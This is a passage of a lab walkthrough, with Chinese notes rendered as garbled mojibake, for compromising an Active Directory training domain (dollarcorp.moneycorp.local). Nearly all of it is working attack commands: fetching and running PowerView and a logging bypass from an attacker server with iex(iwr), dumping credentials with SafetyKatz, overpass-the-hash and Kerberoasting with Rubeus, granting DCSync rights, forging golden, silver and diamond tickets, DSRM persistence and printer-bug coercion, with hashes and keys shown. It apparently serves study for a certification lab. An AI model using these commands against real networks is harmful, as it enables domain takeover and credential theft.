C:\AD\Tools&amp;gt;cat C:\AD\Tools\servers.txt
DCORP-ADMINSRV
DCORP-APPSRV
DCORP-CI
DCORP-MGMT
DCORP-MSSQL

&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨PowerViewæšä¸¾ä¸ç®¡ç†å‘˜ç™»å½•çš„æœºå™¨&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;iex (iwr http://172.16.100.26:8080/sbloggingbypass.txt -UseBasicParsing)

iex ((New-Object Net.WebClient).DownloadString(&apos;http://172.16.100.26:8080/PowerView.ps1&apos;))

Find-DomainUserLocation

iwr http://172.16.100.26:8080/Loader.exe -OutFile C:\Users\Public\Loader.exe

echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

$null | winrs -r:dcorp-mgmt &quot;netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26&quot;

###sudo  python3 -m http.server 80

$null | winrs -r:dcorp-mgmt &quot;cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨overpass-the-hashé‡æ”¾svcadminçš„å‡­è¯&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

#éªŒè¯
winrs -r:dcorp-dc cmd /c set username
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æŸ¥è¯¢å½“å‰Powershellä¼šè¯çš„è¯­è¨€æ¨¡å¼&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$ExecutionContext.SessionState.LanguageMode

FullLanguage									#å®Œæ•´è¯­è¨€æ¨¡å¼--å…è®¸ä¼šè¯ä¸­çš„æ‰€æœ‰è¯­è¨€å…ƒç´ ;
ConstrainedLanguage						#çº¦æŸè¯­è¨€æ¨¡å¼--å…è®¸åŸºæœ¬è¯­è¨€å…ƒç´ ï¼Œä¾‹å¦‚å¾ªç¯ã€æ¡ä»¶ã€å­—ç¬¦ä¸²æ‰©å±•å’Œè®¿é—®å¯¹è±¡å±æ€§;
NoLanguage										#æ— è¯­è¨€æ¨¡å¼--å®Œå…¨ç¦ç”¨ PowerShell è„šæœ¬è¯­è¨€;
RestrictedLanguage						#å—é™è¯­è¨€æ¨¡å¼--å¯ä»¥(cmdletã€å‡½æ•°ã€CIM å‘½ä»¤å’Œå·¥ä½œæµ)è¿è¡Œå‘½ä»¤ï¼Œä½†ä¸èƒ½ä½¿ç”¨è„šæœ¬å—;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æ»¥ç”¨æ´¾ç”Ÿæœ¬åœ°ç®¡ç†å‘˜&lt;/h4&gt;
&lt;p&gt;æ‰¾å‡ºå…·æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™çš„æœºå™¨&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç™»å½•adminsrv(Constrained Language Mode)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-adminsrv cmd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡æŸ¥æ³¨å†Œè¡¨æ£€æŸ¥è¯¥ç”¨æˆ·æ˜¯å¦é…ç½®äº†åº”ç”¨é”(Applocker)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡æ³¨å†Œè¡¨æŸ¥è¯¢SRPv2(è„šæœ¬é™åˆ¶ç­–ç•¥)è§„åˆ™çš„è¯¦ç»†å†…å®¹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\xxxx-xxxx-xxxx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹Ÿå¯ä»¥ä½¿ç”¨powershellå‘½ä»¤åœ¨dcrop-adminsrvä¸ŠæŸ¥è¯¢&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Enter-PSSession dcorp-adminsrv
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»studentæœºå™¨å¤åˆ¶è„šæœ¬åˆ°adminsrv&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-std226.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\&apos;Program Files&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œä¿®æ”¹åçš„mimikatz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Enter-PSSession dcorp-adminsrv
cd &apos;C:\Program Files\&apos;
.\Invoke-MimiEx-keys-std226.ps1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»å‡­æ®åº“ä¸­æŸ¥æ‰¾å‡­æ®ä»¥è·å¾—æ˜æ–‡å‡­æ®&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Copy-Item C:\AD\Tools\Invoke-MimiEx-vault-std226.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\&apos;Program Files&apos;

Enter-PSSession dcorp-adminsrv
cd &apos;C:\Program Files\&apos;
.\Invoke-MimiEx-vault-std226.ps1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨runaså¯åŠ¨cmdï¼Œæ–°è¿›ç¨‹æœ‰srvadminçš„æƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;runas /user:dcorp\srvadmin /netonly cmd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ£€æŸ¥srvadminåœ¨å…¶ä»–æœºå™¨ä¸Šæœ‰æ²¡æœ‰ç®¡ç†å‘˜æƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨SafetyKatzä»æœºå™¨ä¸­æå–å‡­è¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

$null | winrs -r:dcorp-mgmt &quot;netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26&quot;

winrs -r:dcorp-mgmt 

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe &quot;sekurlsa::Evasive-keys&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;é€šè¿‡ä¿®æ”¹GPOç¦ç”¨dcorp-adminsrvä¸Šçš„applocker&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;runas /user:dcorp\student226 /netonly cmd

gpmc.msc

expand Forest -&amp;gt; Domains -&amp;gt; dollarcorp.moneycorp.local -&amp;gt; Applocked -&amp;gt; Right click -&amp;gt; Edit

Computer Configuration -&amp;gt; Policies -&amp;gt; Windows Settings -&amp;gt; Security Settings -&amp;gt; Application Control Policies -&amp;gt; Applocker 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¼ºåˆ¶æ›´æ–°ç»„ç­–ç•¥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-adminsrv cmd
gpupdate /force
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¤åˆ¶Loaderåˆ°æœºå™¨ä¸Šå¹¶è¿è¡ŒSafetyKatz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-adminsrv cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args &quot;sekurlsa::evasive-keys&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;DCSyncæ”»å‡»&lt;/h4&gt;
&lt;p&gt;æ£€æŸ¥æ˜¯å¦å…·æœ‰å¤åˆ¶æƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView.ps1

Get-DomainObjectAcl -SearchBase &quot;DC=dollarcorp,DC=moneycorp,DC=local&quot; -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match &apos;replication-get&apos;) -or ($_.ActiveDirectoryRights -match &apos;GenericAll&apos;)} | ForEach-Object {$_ | Add-Member NoteProperty &apos;IdentityName&apos; $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match &quot;student226&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ·»åŠ å¤åˆ¶æƒé™ï¼ˆä»¥åŸŸç®¡ç†å‘˜èº«ä»½ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat

. C:\AD\Tools\PowerView.ps1

Add-DomainObjectAcl -TargetIdentity &apos;DC=dollarcorp,DC=moneycorp,DC=local&apos; -PrincipalIdentity student226  -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å†æ¬¡æ£€æŸ¥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20606
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student226

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20606
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student226

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-20606
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student226
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥studentèº«ä»½è·å–ä»»æ„ç”¨æˆ·çš„hashes&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä¿®æ”¹å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSDpropï¼‰&lt;/h4&gt;
&lt;p&gt;è·å¾—æœºå™¨çš„ç®¡ç†æƒé™åå¯ä»¥ä¿®æ”¹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# ä»¥åŸŸç®¡ç†å‘˜èº«ä»½ï¼Œä¿®æ”¹DCä¸ŠWMIçš„å®‰å…¨æ ‡è¯†ç¬¦ï¼Œå…è®¸studentè®¿é—®WMI

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\RACE.ps1

Set-RemoteWMI -SamAccountName student226 -ComputerName dcorp-dc -namespace &apos;root\cimv2&apos; -Verbose

# éªŒè¯ ä½œä¸ºstudentåœ¨DCä¸Šæ‰§è¡ŒWMI
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Kerberoasting æ”»å‡»&lt;/h4&gt;
&lt;p&gt;æ‰¾åˆ°ä½¿ç”¨ç”¨æˆ·è´¦æˆ·è¿è¡Œçš„æœåŠ¡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainUser -SPN
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŸ¥æ‰¾ä»…æ”¯æŒRC4hmacåŠ å¯†çš„kerberoastableè´¦æˆ·&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe kerberoast /stats /rc4opsec
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡svcadminçš„å¯†ç æˆ–AESç§˜é’¥è·å–TGTï¼Œå¹¶æ³¨å…¥å½“å‰ä¼šè¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰§è¡Œ Kerberoasting&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;é»„é‡‘ç¥¨æ®&lt;/h2&gt;
&lt;h4&gt;åˆ©ç”¨DAæƒé™è·å–krbtgtçš„NTLM hash&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args &quot;lsadump::evasive-lsa /patch&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åˆ©ç”¨DCSyncæ”»å‡»è·å–krbtgtçš„NTLM hashå’ŒAES keys&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨Rubeusåˆ¶ä½œé»„é‡‘ç¥¨&lt;/h4&gt;
&lt;p&gt;åˆ©ç”¨å·²çŸ¥ krbtgt AES256 hash + åŸŸSIDï¼Œä¼ªé€  Administrator ç¥¨æ®ï¼Œå¹¶æ˜¾ç¤ºæ„å»ºå‡ºçš„ Rubeus å‘½ä»¤æˆ–æ”»å‡»è¾“å‡ºï¼Œå®ç°åŸŸæ§å®Œå…¨æ§åˆ¶ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd C:\AD\Tools

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ç”Ÿæˆçš„å‘½ä»¤ä¼ªé€ é‡‘ç¥¨ï¼ŒLoaderåæ·»åŠ  -path ä½¿ç”¨åŠ è½½å™¨è¿è¡Œï¼Œç»“å°¾æ·»åŠ  /ptt ä»¥å°†ç¥¨æ®æ³¨å…¥åˆ°å½“å‰ä¼šè¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:&quot;11/11/2022 6:34:22 AM&quot; /minpassage:1 /logoncount:412 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt

winrs -r:dcorp-dc cmd

set username

set computername
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ç™½é“¶ç¥¨æ®&lt;/h2&gt;
&lt;h4&gt;åˆ›å»ºhttpæœåŠ¡çš„ç™½é“¶ç¥¨æ®&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:d79ad890d24d8df4936f85bf11d8fd5b /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æ£€æŸ¥æ˜¯å¦è·å¾—ç¥¨æ®&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨winrsè®¿é—®&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd

# éªŒè¯
set username
set computername
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åˆ›å»ºWMIæœåŠ¡çš„ç™½é“¶ç¥¨æ®&lt;/h4&gt;
&lt;p&gt;WMIéœ€è¦hostå’Œrpcssä¸¤ä¸ªæœåŠ¡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:d79ad890d24d8df4936f85bf11d8fd5b /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:d79ad890d24d8df4936f85bf11d8fd5b /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯•åœ¨åŸŸæ§è¿è¡Œwmiå‘½ä»¤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;é’»çŸ³ç¥¨æ®&lt;/h2&gt;
&lt;p&gt;å¯¹åŸŸæ§è¯·æ±‚çš„çœŸå®tgtè§£å¯†å¹¶é‡æ–°åŠ å¯†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Windows\system32&amp;gt; C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

winrs -r:dcorp-dc cmd

# éªŒè¯
set username
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æ»¥ç”¨DSRMå‡­è¯å®ç°æŒä¹…åŒ–&lt;/h4&gt;
&lt;p&gt;å‰æï¼šåŸŸç®¡ç†å‘˜æƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args &quot;token::elevate&quot; &quot;lsadump::evasive-sam&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;DSRMç®¡ç†å‘˜ä¸å…è®¸ä»ç½‘ç»œç™»å½•ï¼Œéœ€åœ¨DCä¸Šä¿®æ”¹æ³¨å†Œè¡¨æ›´æ”¹ç™»å½•è¡Œä¸º&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;DsrmAdminLogonBehavior&quot; /t REG_DWORD /d 2 /f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pass-The-Hash&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe &quot;sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe&quot; &quot;exit&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨æ–°ç»ˆç«¯æ·»åŠ å—ä¿¡ä¸»æœº&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#å½“ä½ ä½¿ç”¨ NTLM + IP åœ°å€ åšè¿œç¨‹ PowerShell è¿æ¥æ—¶ï¼ŒWindows é»˜è®¤ä¼šæ‹’ç»è¿æ¥ï¼Œé™¤éä½ æ˜ç¡®å‘Šè¯‰ç³»ç»Ÿâ€œè¿™å°ç›®æ ‡æœºå™¨ï¼ˆ172.16.2.1ï¼‰æ˜¯æˆ‘ä¿¡ä»»çš„ä¸»æœºâ€ã€‚å¦åˆ™ NTLM ä¸å…è®¸å‘ IP åœ°å€è®¤è¯å‡­æ®ï¼Œå› ä¸ºæ— æ³•éªŒè¯è¿œç¨‹ä¸»æœºèº«ä»½ï¼ˆä¸åƒ Kerberos ä¾èµ–åŸŸå + SPNï¼‰

Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿æ¥DC&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential

# éªŒè¯
$env:username
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å§”æ´¾&lt;/h2&gt;
&lt;h4&gt;éçº¦æŸæ€§å§”æ´¾&lt;/h4&gt;
&lt;p&gt;æŸ¥æ‰¾å¯ç”¨äº†éçº¦æŸæ€§å§”æ´¾çš„æœºå™¨&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; Get-DomainComputer -Unconstrained | select -ExpandProperty samaccountname
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨è¯¥æœºå™¨ä¸Šæ‰¾æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ï¼ŒæŒ¨ä¸ªå°è¯•&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šä¼ loader&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;winrsè¿æ¥åˆ°dcorp-appsrvä¸Šè¿è¡ŒRubeus&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-appsrv cmd

# åŠ è·¯ç”±
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26

# ç”¨Rubeusçš„monitoråŠŸèƒ½å®æ—¶ç›‘æ§åä¸ºDCORP-DC$çš„è´¦æˆ·æ˜¯å¦æœ‰å‘èµ·Kerberosè¯·æ±‚ï¼Œæ¯5ç§’æ£€æŸ¥ä¸€æ¬¡ï¼Œè¾“å‡ºæ—¶ä¸æ¢è¡Œï¼Œåˆ©äºæ—¥å¿—å¤„ç†æˆ–åç»­è„šæœ¬åˆ†æã€‚
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨æ‰“å°æœºæ¼æ´æ”»å‡»ï¼ˆå­¦ç”Ÿæœºå™¨å³å¯ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–åˆ©ç”¨MS-RPRN&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;### å‰å‡ ä¸ªæ­¥éª¤åŒä¸Š
winrs -r:dcorp-appsrv cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.26

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap

## åœ¨å­¦ç”Ÿæœºå™¨ä¸Šä½¿ç”¨MS-RPRNè§¦å‘ä»mcorp-dcåˆ°dcorp-appsrvçš„éªŒè¯
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

## 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…ä½¿ç”¨MS-DFSNMã€MS-WSPä¹‹ç±»çš„&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local

C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨Rubeusç›‘å¬ç«¯æ”¶åˆ°dcorp-dc$çš„TGT&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[*] 6/2/2025 3:15:28 AM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
